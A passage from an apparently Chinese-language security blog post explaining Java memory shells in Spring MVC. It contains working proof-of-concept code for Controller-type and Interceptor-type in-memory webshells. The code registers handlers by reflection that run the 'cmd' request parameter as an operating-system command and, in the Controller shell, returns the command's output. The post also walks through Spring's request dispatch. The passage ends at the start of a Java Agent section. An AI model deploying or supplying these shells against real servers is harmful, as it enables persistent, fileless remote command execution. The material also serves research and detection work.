org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/control&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Spring_Controller</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;i am in&quot;</span>);</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> Controller_Shell.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="type">Controller_Shell</span> <span class="variable">springControllerMemShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Controller_Shell</span>();</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller_Shell</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Interceptor型内存马"><a href="#Interceptor型内存马" class="headerlink" title="Interceptor型内存马"></a>Interceptor型内存马</h3><h4 id="什么是Interceptor"><a href="#什么是Interceptor" class="headerlink" title="什么是Interceptor"></a>什么是Interceptor</h4><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。</p><p>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p><ul><li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li><li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li></ul><h4 id="Interceptor示例"><a href="#Interceptor示例" class="headerlink" title="Interceptor示例"></a>Interceptor示例</h4><p>这里我们选择继承HandlerInterceptor接口来实现一个Interceptor。HandlerInterceptor接口有三个方法，如下</p><ul><li>preHandle：该方法在<strong>控制器</strong>的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li></ul><p>这里对构造内存马来说最重要的是这个<code>preHandle</code>方法</p><p><strong>就是如上面所说的  就是在控制器处理请求之前执行</strong></p><p>(这里的话就是涉及到这个开发的MVC知识  了解过的话看这里会容易一点)</p><p>写个demo来判断一下是否是这个样子</p><ul><li><p><strong>Controller</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring_Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Login</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>interceptor</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.interceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="comment">//如果请求路径为/login则放行</span></span><br><span class="line">        <span class="keyword">if</span> ( url.indexOf(<span class="string">&quot;/login&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            writer.write(<span class="string">&quot;LoginIn&quot;</span>);</span><br><span class="line">            writer.flush();</span><br><span class="line">            writer.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        writer.write(<span class="string">&quot;LoginInFirst&quot;</span>);</span><br><span class="line">        writer.flush();</span><br><span class="line">        writer.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>在springmvc.xml配置文件中配置相应的Interceptor</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/*&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.shell.interceptor.Spring_Interceptor&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptors</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230811224051963.png" alt="image-20230811224051963"></p><p>接下来分析这么调用到这个<code>preHandle</code>的</p><h4 id="request调用流程"><a href="#request调用流程" class="headerlink" title="request调用流程"></a>request调用流程</h4><p>在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的</p><p><img src="../images/image-20230811225132955.png" alt="image-20230811225132955"></p><p>这里其实会循环在<code>internalDoFilter</code>和<code>doFilter</code>之间来回调用 可能我选的是第一个internalDoFilter  导致现在只看到一个</p><p>但与Tomcat不同的是，当调用到<code>HttpServlet#service</code>时，最终会调用<code>DispatcherServlet#doDispatch</code>进行逻辑处理，这正是Spring的逻辑处理核心类。</p><p><img src="../images/image-20230811225550782.png" alt="image-20230811225550782"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">doDispatch:1028, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:963, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:655, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:162, ApplicationFilterChain (org.apache.catalina.core)</span><br></pre></td></tr></table></figure><p>跟进到<code>getHandler</code>方法</p><p><img src="../images/image-20230814145912527.png" alt="image-20230814145912527"></p><p>在 <code>getHandler</code> 方法中，会通过遍历 <code>this.handlerMappings</code> 来获取 <code>HandlerMapping</code> 对象实例 <code>mapping</code></p><p>(<img src="../images/image-20230814153013853.png" alt="image-20230814153013853">)</p><p>这个<code>mapping</code>正好是<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类，如何调用到getHandler方法</p><p>并通过 <code>getHandlerExecutionChain(handler, request)</code> 方法返回 <code>HandlerExecutionChain</code> 类的实例</p><p><img src="../images/image-20230814152525139.png" alt="image-20230814152525139"></p><p>跟进<code>AbstractHandlerMapping</code>#<code>getHandlerExecutionChain</code></p><p><img src="../images/image-20230814153104142.png" alt="image-20230814153104142"></p><p>可以看到其通过<code>adaptedInterceptors</code>获取所有Interceptor后进行遍历，其中可以看见一个我们自己定义的Interceptor</p><p>然后通过<code>chain.addInterceptor()</code>将所有Interceptor添加到<code>HandlerExecutionChain</code>中。<strong>最后返回到<code>DispatcherServlet#doDispatch()</code>中</strong>，调用<code>mappedHandler.applyPreHandle</code>方法</p><p><img src="../images/image-20230814153745665.png" alt="image-20230814153745665"></p><p><img src="../images/image-20230814153802029.png" alt="image-20230814153802029"></p><p>然后遍历调用Interceptor中的<code>preHandle()</code>拦截方法。</p><p>因此当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller</span><br></pre></td></tr></table></figure><p>前面大量的分析主要都是分析在<code>DispactherServlet</code>在如何获取<code>Interceptor</code>的过程中</p><h4 id="Interceptor型内存马实现过程"><a href="#Interceptor型内存马实现过程" class="headerlink" title="Interceptor型内存马实现过程"></a>Interceptor型内存马实现过程</h4><p>通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。由于Interceptor和Filter有一定的相似之处，因此我们可以仿照Filter型内存马的实现思路</p><ul><li>获取当前运行环境的上下文</li><li>实现恶意Interceptor</li><li>注入恶意Interceptor</li></ul><h5 id="获取环境上下文"><a href="#获取环境上下文" class="headerlink" title="获取环境上下文"></a>获取环境上下文</h5><p>在Controller型内存马中，给出了四种获取Spring上下文<code>ApplicationContext</code>的方法。下面我们还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span></span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 属性被 private 修饰，所以 setAccessible true</span></span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 3. 获取一个 ApplicationContext 实例</span></span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> <strong>3.2.x</strong> 版本（现在最新版本是 <strong>5.3.x</strong>）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。</p><h5 id="获取adaptedInterceptors属性值"><a href="#获取adaptedInterceptors属性值" class="headerlink" title="获取adaptedInterceptors属性值"></a>获取adaptedInterceptors属性值</h5><p>获得 <code>ApplicationContext</code> 实例后，还需要知道 <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类实例的 bean name 叫什么。</p><p><img src="../images/image-20230814155326510.png" alt="image-20230814155326510"></p><p>在这类里面给<code>adaptedInterceptors</code>赋值 </p><p>我们可以通过<code>ApplicationContext</code>上下文来获取<code>AbstractHandlerMapping</code>，进而反射获取<code>adaptedInterceptors</code>属性值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure><h5 id="实现恶意Interceptor"><a href="#实现恶意Interceptor" class="headerlink" title="实现恶意Interceptor"></a>实现恶意Interceptor</h5><p>这里选择继承HandlerInterceptor接口，并重写其preHandle方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.interceptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="动态注册Interceptor"><a href="#动态注册Interceptor" class="headerlink" title="动态注册Interceptor"></a>动态注册Interceptor</h5><p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p><p><strong>(这里能使用这个<code>add()</code>的原因是这个<code>adaptedInterceptors</code>是这个List类型  所以可以使用add())</strong></p><p><img src="../images/image-20230814162445148.png" alt="image-20230814162445148"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将恶意Interceptor添加入adaptedInterceptors</span></span><br><span class="line"><span class="type">Shell_Interceptor</span> <span class="variable">shell_interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();</span><br><span class="line">adaptedInterceptors.add(shell_interceptor);</span><br></pre></td></tr></table></figure><h5 id="完整POC-5"><a href="#完整POC-5" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Shell_Interceptor_Controller</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Inject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取adaptedInterceptors属性值</span></span><br><span class="line">        org.springframework.web.servlet.handler.<span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">//将恶意Interceptor添加入adaptedInterceptors</span></span><br><span class="line">        <span class="type">Shell_Interceptor</span> <span class="variable">shell_interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();</span><br><span class="line">        adaptedInterceptors.add(shell_interceptor);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230814165426691.png" alt="image-20230814165426691"></p><p><img src="../images/image-20230814165518672.png" alt="image-20230814165518672"></p><p>成功弹出计算器</p><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><h3 id="Jvav-Agent是什么"><a href="#Jvav-Agent是什么" class="headerlink" title="Jvav_Agent是什么"></a>Jvav_Agent是什么</h3><p>我们知道Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，平时较为常见的技术如热部署、一些诊断工具等都是基于Java Agent技术来实现的。那么Java Agent技术具体是怎样实现的呢？</p><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的<code>premain-Agent</code>，另一种是JVM启动之后加载的<code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p><p><img src="../images/image-20230816144454646.png" alt="image-20230816144454646"></p><h3 id="Java-Agent示例"><a href="#Java-Agent示例" class="headerlink" 